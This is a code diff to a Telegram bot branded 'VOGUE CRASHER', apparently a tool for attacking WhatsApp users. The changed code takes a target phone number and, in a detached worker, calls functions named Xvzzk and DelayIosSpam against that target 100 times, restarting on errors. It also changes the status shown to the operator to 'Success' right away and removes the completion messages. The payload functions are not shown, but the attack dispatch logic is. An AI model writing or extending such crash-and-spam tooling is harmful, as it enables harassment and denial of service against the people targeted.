@@ -967,7 +967,7 @@ let maintenanceMode = false;
 
 const maintenanceMessage = `
 <pre>
-V O G U E  •  S Y S T E M
+V O G U E  •  C R A S H E R
 ──────────────────────────
 
 SYSTEM MAINTENANCE
@@ -1058,7 +1058,7 @@ bot.command(
 
         return ctx.reply(
 `<pre>
-V O G U E  •  S Y S T E M
+V O G U E  •  C R A S H E R
 ──────────────────────────
 
 MAINTENANCE ENABLED
@@ -1088,7 +1088,7 @@ bot.command(
 
         return ctx.reply(
 `<pre>
-V O G U E  •  S Y S T E M
+V O G U E  •  C R A S H E R
 ──────────────────────────
 
 MAINTENANCE DISABLED
@@ -2036,7 +2036,7 @@ V O G U E  •  C R A S H E R
 EXECUTION STATUS
 
 Target      : ${q}
-Status      : Processing
+Status      : Success
 
 ──────────────────────────
 </pre>`,
@@ -2051,69 +2051,27 @@ Status      : Processing
             }
         });
         
-        // 🚀 ISOLATED WORKER (PARALLEL SAFE)
         (async () => {
             
-            const instanceId = Date.now() + Math.random(); // unik per user instance
-            
+            const instanceId = Date.now() + Math.random();
             for (let i = 0; i < 100; i++) {
-                
                 try {
-                    
                     if (!sock) {
                         throw new Error("Socket unavailable");
                     }
-                    
                     await Xvzzk(sock, target);
                     await sleep(1000);
                     await DelayIosSpam(sock, target);
                     await sleep(1000);
-                    
                 } catch (e) {
                     console.log(`[WORKER ${instanceId}] Error: ${e.message}`);
                     autoRestartOn408(e);
                 }
             }
             
-            try {
-                await ctx.telegram.editMessageCaption(
-                    ctx.chat.id,
-                    sent.message_id,
-                    undefined,
-                    `
-<pre>
-V O G U E  •  C R A S H E R
-──────────────────────────
-
-EXECUTION STATUS
-
-Target      : ${q}
-Status      : SUCCESS
-
-──────────────────────────
-All processes completed successfully.
-</pre>`,
-                    {
-                        parse_mode: "HTML",
-                        reply_markup: {
-                            inline_keyboard: [
-                                [{
-                                    text: "Check Target",
-                                    url: `https://wa.me/${q}`
-                                }]
-                            ]
-                        }
-                    }
-                );
-            } catch (e) {
-                console.log(`[WORKER ${instanceId}] Final update failed`);
-            }
-            
             console.log(`[WORKER ${instanceId}] Done for ${q}`);
             
-        })(); // 🔥 DETACHED → NON BLOCKING
-        
-        // handler langsung selesai di sini (tidak nunggu worker)
+        })();
         
     } catch (error) {
         
@@ -2156,10 +2114,9 @@ V O G U E  •  C R A S H E R
 EXECUTION STATUS
 
 Target      : ${q}
-Status      : Processing
+Status      : Success
 
 ──────────────────────────
-Dispatch engine is currently active.
 </pre>`,
             parse_mode: "HTML",
             reply_markup: {
@@ -2185,42 +2142,12 @@ Dispatch engine is currently active.
                     console.log(
                         `[VOGUE CRASHER] Dispatch Error: ${e.message}`
                     );
-                    
+                    autoRestartOn408(e);
                 }
                 
                 await sleep(1500);
             }
-            
-            await ctx.telegram.editMessageCaption(
-                ctx.chat.id,
-                sent.message_id,
-                undefined,
-                `
-<pre>
-V O G U E  •  C R A S H E R
-──────────────────────────
-
-EXECUTION STATUS
-
-Target      : ${q}
-Status      : Complete
-
-──────────────────────────
-Execution completed successfully.
-</pre>`,
-                {
-                    parse_mode: "HTML",
-                    reply_markup: {
-                        inline_keyboard: [
-                            [
-                            {
-                                text: "Check Target",
-                                url: `https://wa.me/${q}`
-                            }]
-                        ]
-                    }
-                }
-            );
+           
             
             console.log(
                 `[VOGUE CRASHER] Execution completed successfully for ${q}`
